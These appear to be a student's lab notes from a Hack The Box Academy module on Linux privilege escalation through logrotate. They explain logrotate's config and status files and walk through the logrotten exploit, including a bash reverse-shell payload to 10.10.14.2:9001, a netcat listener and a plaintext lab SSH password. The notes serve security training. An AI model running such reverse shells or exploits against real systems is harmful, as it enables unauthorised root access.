- Archives and or deletes old logs
- Pulls logs from /var/log
- Started periodically via cron
- Controlled via the configuration file /etc/logrotate.conf
- Logs can be renamed or created for each new day, older ones are automatically renamed

```
datboyblu3@htb[/htb]$ man logrotate
datboyblu3@htb[/htb]$ # or
datboyblu3@htb[/htb]$ logrotate --help

Usage: logrotate [OPTION...] <configfile>
  -d, --debug               Don't do anything, just test and print debug messages
  -f, --force               Force file rotation
  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')
  -s, --state=statefile     Path of state file
      --skip-state-lock     Do not lock the state file
  -v, --verbose             Display messages during rotation
  -l, --log=logfile         Log file or 'syslog' to log to syslog
      --version             Display version information

Help options:
  -?, --help                Show this help message
      --usage               Display brief usage message
```

### Logrotate Config File

```
datboyblu3@htb[/htb]$ cat /etc/logrotate.conf


# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.
```

**Logrotate Status File**
This file can be used to set a new rotation either in the status file itself or using the `-f/--force` option
```
datboyblu3@htb[/htb]$ sudo cat /var/lib/logrotate.status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3
```

**Application Config Files in /etc/logrotate.d**
```
datboyblu3@htb[/htb]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

### Requirements to Exploit
- Must be writable
- Must run as privileged user or root
- Vulnerable Versions:
	- 3.8.6
	- 3.11.0
	- 3.15.0
	- 3.18.0

### Exploit Logrotate

The example is using a prefabricated exploit called [logrotten](https://github.com/whotwagner/logrotten)

**Create Payload**
```
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

**Determine which option logrotate uses in logrotate.conf**
```
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create
```

This logrotate option will create a new, empty log after rotating old ones

**Start your listener**
```
datboyblu3@htb[/htb]$ nc -nlvp 9001

Listening on 0.0.0.0 9001
```

**Execute the payload with logrotten**
```
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```

## Questions

### SSH
```
ssh htb-student@10.129.204.41
```

### Passwd
```
HTB_@cademy_stdnt!
```

What version of logrotate is on the box and is it vulnerable?
```
htb-student@ubuntu:~$ logrotate --version
logrotate 3.11.0
htb-student@ubuntu:~$
```
Yes it is!

What files/directories can I write to?

The `backup` directory has executable permissions and two files present: access.log and access.log.1

I have read permissions to both but only access.log.1 has data in it as seen in the second code fragment
```
htb-student@ubuntu:~$ ls -l
total 4
drwxr-xr-x 2 htb-student htb-student 4096 Jun 14  2023 backups
htb-student@ubuntu:~$ cd backups/
htb-student@ubuntu:~/backups$ ls -la
total 12
drwxr-xr-x 2 htb-student htb-student 4096 Jun 14  2023 .
drwxr-xr-x 4 htb-student htb-student 4096 Mar 20 23:58 ..
-rw-r--r-- 1 htb-student htb-student    0 Jun 14  2023 access.log
-rw-r--r-- 1 htb-student htb-student   91 Jun 14  2023 access.log.1
htb-student@ubuntu:~/backups$ 

```

The log file shows a curl request to 192.168.0.104 /robbie03 was not found. This 
```
htb-student@ubuntu:~/backups$ cat access.log.1
192.168.0.104 - - [29/Jun/2019:14:39:55 +0000] "GET /robbie03 HTTP/1.1" 404 446 "-" "curl"
htb-student@ubuntu:~/backups$ 
```

Verify logrotate status. This file executed on June 14 2023 at 2pm?
```
htb-student@ubuntu:/etc/logrotate.d$ cat /var/lib/logrotate.status
logrotate state -- version 2
"/home/htb-student/backups/access.log" 2023-6-14-14:1:27
```

